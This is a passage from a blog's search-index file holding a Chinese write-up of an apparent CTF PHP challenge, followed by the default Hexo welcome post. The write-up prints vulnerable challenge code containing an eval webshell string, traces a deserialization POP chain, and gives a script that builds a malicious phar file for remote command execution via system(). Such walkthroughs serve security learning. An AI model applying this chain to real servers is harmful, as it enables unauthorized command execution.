class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">aa</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$name</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;name=<span class="hljs-string">&#x27;aa&#x27;</span>;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;name=<span class="hljs-title function_ invoke__">strtolower</span>(<span class="hljs-variable">$this</span>-&gt;name);<br>    &#125;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">ff</span></span>&#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$content</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$func</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;content=<span class="hljs-string">&quot;\&lt;?php @eval(\$_POST[1]);?&gt;&quot;</span>;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__get</span>(<span class="hljs-params"><span class="hljs-variable">$key</span></span>)</span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-variable">$key</span>-&gt;&#123;<span class="hljs-variable language_">$this</span>-&gt;func&#125;(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;cmd&#x27;</span>]);<br>    &#125;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">zz</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$filename</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$content</span>=<span class="hljs-string">&#x27;surprise&#x27;</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$filename</span></span>)</span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;filename=<span class="hljs-variable">$filename</span>;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">filter</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/^\/|php:|data|zip|\.\.\//i&#x27;</span>,<span class="hljs-variable">$this</span>-&gt;filename))&#123;<br>            <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;这不合理&#x27;</span>);<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">write</span>(<span class="hljs-params"><span class="hljs-variable">$var</span></span>)</span>&#123;<br>        <span class="hljs-variable">$filename</span>=<span class="hljs-variable language_">$this</span>-&gt;filename;<br>        <span class="hljs-variable">$lt</span>=<span class="hljs-variable language_">$this</span>-&gt;filename-&gt;<span class="hljs-variable">$var</span>;<br>        <span class="hljs-comment">//此功能废弃，不想写了</span><br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">getFile</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">filter</span>();<br>        <span class="hljs-variable">$contents</span>=<span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-variable">$this</span>-&gt;filename);<br>        <span class="hljs-keyword">if</span>(!<span class="hljs-keyword">empty</span>(<span class="hljs-variable">$contents</span>))&#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-variable">$contents</span>;<br>        &#125;<span class="hljs-keyword">else</span>&#123;<br>            <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;404 not found&quot;</span>);<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__toString</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;&#123;<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;method&#x27;</span>]&#125;(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;var&#x27;</span>]);<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable language_">$this</span>-&gt;content;<br>    &#125;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">xx</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$name</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$arg</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;name=<span class="hljs-string">&#x27;eval&#x27;</span>;<br>        <span class="hljs-variable language_">$this</span>-&gt;arg=<span class="hljs-string">&#x27;phpinfo();&#x27;</span>;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__call</span>(<span class="hljs-params"><span class="hljs-variable">$name</span>,<span class="hljs-variable">$arg</span></span>)</span>&#123;<br>        <span class="hljs-variable">$name</span>(<span class="hljs-variable">$arg</span>[<span class="hljs-number">0</span>]);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>分析：</p><p>在read.php中看到入口$file&#x3D;new zz($filename);</p><p>跟进代码class.php</p><p>发现能执行代码处</p><p><img src="/img/992f908cc8b546af8573b7ec39219ed1-1699950458591-63.png"></p><p>要想触发xx-&gt;call（用于在对象中调用一个不存在的方法时自动被调用),可以通过 ff-&gt;get</p><p><img src="/img/a564c62ab40b4f75887d502a055432bf-1699950458591-64.png"></p><p>要想触发ff-&gt;get(用于在对象中访问一个不存在或者不可访问的属性时自动被调用)，可以通过在ff类方面调用私有属性content，可以通过zz-&gt;write实现，</p><p><img src="/img/a272dbaf413640de900a39ab05930235-1699950458591-65.png"></p><p>要想触发zz-&gt;write,可以通过zz-&gt;toString,其中method参数传write，var传私有属性content</p><p><img src="/img/80de02b2662d4c019f27351adc43f69d-1699950458591-66.png"></p><p>要想zz-&gt;to_String(对象被当成字符串使用时调用)，可以通过aa-&gt;_destruct中的strtolower函数</p><p><img src="/img/22e2638ca6df496cbb872246290f619f-1699950458591-67.png"></p><p>分析到这里，可以编写exp</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">aa</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$name</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;name=<span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">zz</span>();<br>    &#125;<br><br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">ff</span></span>&#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$content</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$func</span>=<span class="hljs-string">&#x27;system&#x27;</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;content=<span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">xx</span>();<br>    &#125;<br><br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">zz</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$filename</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$content</span>=<span class="hljs-string">&#x27;surprise&#x27;</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;filename=<span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">ff</span>();<br>    &#125;<br><br>   <br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">xx</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$name</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$arg</span>;<br>&#125;<br><span class="hljs-variable">$a</span>=<span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">aa</span>();<br><span class="hljs-variable">$phar</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Phar</span>(<span class="hljs-string">&quot;hack.phar&quot;</span>);<br><span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">startBuffering</span>();<br><span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">setStub</span>(<span class="hljs-string">&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;</span>);<br><span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">setMetadata</span>(<span class="hljs-variable">$a</span>);<br><span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">addFromString</span>(<span class="hljs-string">&quot;test.txt&quot;</span>, <span class="hljs-string">&quot;test&quot;</span>);<br><span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">stopBuffering</span>();<br></code></pre></td></tr></table></figure><p>将生成的hack.phar上传，然后使用phar伪协议读取的时候通过file_get_contents()函数进行反序列化</p><p><img src="/img/230d24486382499486251abf7f6fb322-1699950458591-68.png"></p><p><img src="/img/97d95aaea931451b850500ce49f8be26-1699950458591-69.png"></p></blockquote>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>Hello World</title>
    <link href="/2023/11/13/hello-world/"/>
    <url>/2023/11/13/hello-world/</url>
    
    <content type="html"><![CDATA[<p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p><h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo new <span class="hljs-string">&quot;My New Post&quot;</span><br></code></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p><h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo server<br></code></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p><h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo generate<br></code></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p><h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo deploy<br></code></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>]]></content>
    
    
    
  </entry>
  
  
  
  
</search>
